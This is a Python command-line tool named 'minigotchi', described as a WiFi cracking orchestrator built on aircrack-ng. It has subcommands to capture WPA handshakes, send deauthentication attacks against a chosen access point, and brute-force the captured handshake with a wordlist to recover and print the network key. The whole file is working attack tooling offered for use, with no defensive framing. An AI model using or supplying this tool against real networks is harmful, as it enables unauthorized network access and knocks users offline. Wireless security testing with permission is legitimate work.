#!/usr/bin/env python3
import os
import sys
import argparse
import logging
import shutil
import atexit

from minigotchi.config_loader import load_config
from minigotchi.wifi_scanner import enable_monitor, disable_monitor, capture_handshake, valid_handshake
from minigotchi.deauth_attack import deauth_attack
from minigotchi.password_brute import brute_force

# Setup logging
def setup_logging(log_dir, verbose=False):
    os.makedirs(log_dir, exist_ok=True)
    log_file = os.path.join(log_dir, 'minigotchi.log')
    level = logging.DEBUG if verbose else logging.INFO

    handler_console = logging.StreamHandler(sys.stdout)
    handler_console.setLevel(level)

    from logging.handlers import RotatingFileHandler
    handler_file = RotatingFileHandler(log_file, maxBytes=10*1024*1024, backupCount=3)
    handler_file.setLevel(logging.DEBUG)

    fmt = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s')
    handler_console.setFormatter(fmt)
    handler_file.setFormatter(fmt)

    root = logging.getLogger()
    root.setLevel(logging.DEBUG)
    root.addHandler(handler_console)
    root.addHandler(handler_file)
    return root

def check_tool(tool_name):
    if shutil.which(tool_name) is None:
        logging.error("Required tool not found: %s", tool_name)
        sys.exit(1)

def register_cleanup(mon_iface):
    """Ensure monitor mode is disabled on exit."""
    if mon_iface:
        atexit.register(disable_monitor, mon_iface)

def do_scan(cfg, args):
    iface = args.iface or cfg['interface']
    bssid = args.bssid
    channel = args.channel
    timeout = args.timeout or cfg.get('scan_timeout', 60)

    logging.info("Starting handshake capture on %s (BSSID=%s, channel=%s)", iface, bssid, channel)
    mon_iface = enable_monitor(iface)
    register_cleanup(mon_iface)

    pcap = capture_handshake(mon_iface, channel, bssid, timeout=timeout)
    if not valid_handshake(pcap):
        logging.error("No valid handshake found in %s", pcap)
        sys.exit(1)

    logging.info("Handshake captured at %s", pcap)
    return pcap

def do_deauth(cfg, args):
    iface = args.iface or cfg['interface']
    bssid = args.bssid
    count = args.count or cfg.get('deauth_count', 10)
    interval = args.interval or cfg.get('deauth_interval')
    ignore_neg = not args.no_ignore_negative_one

    logging.info("Launching deauth attack on %s (BSSID=%s)", iface, bssid)
    mon_iface = enable_monitor(iface)
    register_cleanup(mon_iface)

    deauth_attack(mon_iface, bssid, count=count, ignore_negative_one=ignore_neg, interval=interval)

def do_brute(cfg, args):
    pcap = args.capture
    bssid = args.bssid
    wordlist = args.wordlist or cfg['wordlist_path']
    tool = args.tool or cfg.get('preferred_tool')
    timeout = args.timeout or cfg.get('brute_timeout')

    logging.info("Starting brute-force attack on %s using %s", pcap, wordlist)
    key = brute_force(pcap, bssid, wordlist, tool_preference=tool, timeout=timeout)
    logging.info("Cracked key: %s", key)
    print(key)

def main():
    cfg = load_config()
    setup_logging(cfg['output_dir'], verbose=False)

    # Verify critical tools early
    for t in ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng']:
        check_tool(t)

    parser = argparse.ArgumentParser(prog='minigotchi',
        description="Minigotchi WiFi cracking orchestrator")
    sub = parser.add_subparsers(dest='command', required=True)

    # scan subcommand
    p_scan = sub.add_parser('scan', help='Capture WPA handshake')
    p_scan.add_argument('--iface', help='Wireless interface')
    p_scan.add_argument('--bssid', required=True, help='Target AP BSSID')
    p_scan.add_argument('--channel', type=int, required=True, help='Target channel')
    p_scan.add_argument('--timeout', type=int, help='Capture timeout (seconds)')
    p_scan.set_defaults(func=do_scan)

    # deauth subcommand
    p_deauth = sub.add_parser('deauth', help='Perform deauthentication attack')
    p_deauth.add_argument('--iface', help='Wireless interface')
    p_deauth.add_argument('--bssid', required=True, help='Target AP BSSID')
    p_deauth.add_argument('-c','--count', type=int, help='Number of deauth packets')
    p_deauth.add_argument('-i','--interval', type=float, help='Interval between packets (ms)')
    p_deauth.add_argument('--no-ignore-negative-one', action='store_true',
                          dest='no_ignore_negative_one',
                          help='Disable --ignore-negative-one')
    p_deauth.set_defaults(func=do_deauth)

    # brute subcommand
    p_brute = sub.add_parser('brute', help='Run dictionary attack')
    p_brute.add_argument('capture', help='Handshake capture file (.cap)')
    p_brute.add_argument('--bssid', required=True, help='Target AP BSSID')
    p_brute.add_argument('--wordlist', help='Wordlist path')
    p_brute.add_argument('--tool', choices=list(brute_force.__globals__['TOOLS'].keys()),
                         help='Preferred cracking tool')
    p_brute.add_argument('--timeout', type=int, help='Brute-force timeout (seconds)')
    p_brute.set_defaults(func=do_brute)

    args = parser.parse_args()

    try:
        args.func(cfg, args)
    except Exception as e:
        logging.exception("Fatal error: %s", e)
        sys.exit(1)

if __name__ == '__main__':
    main()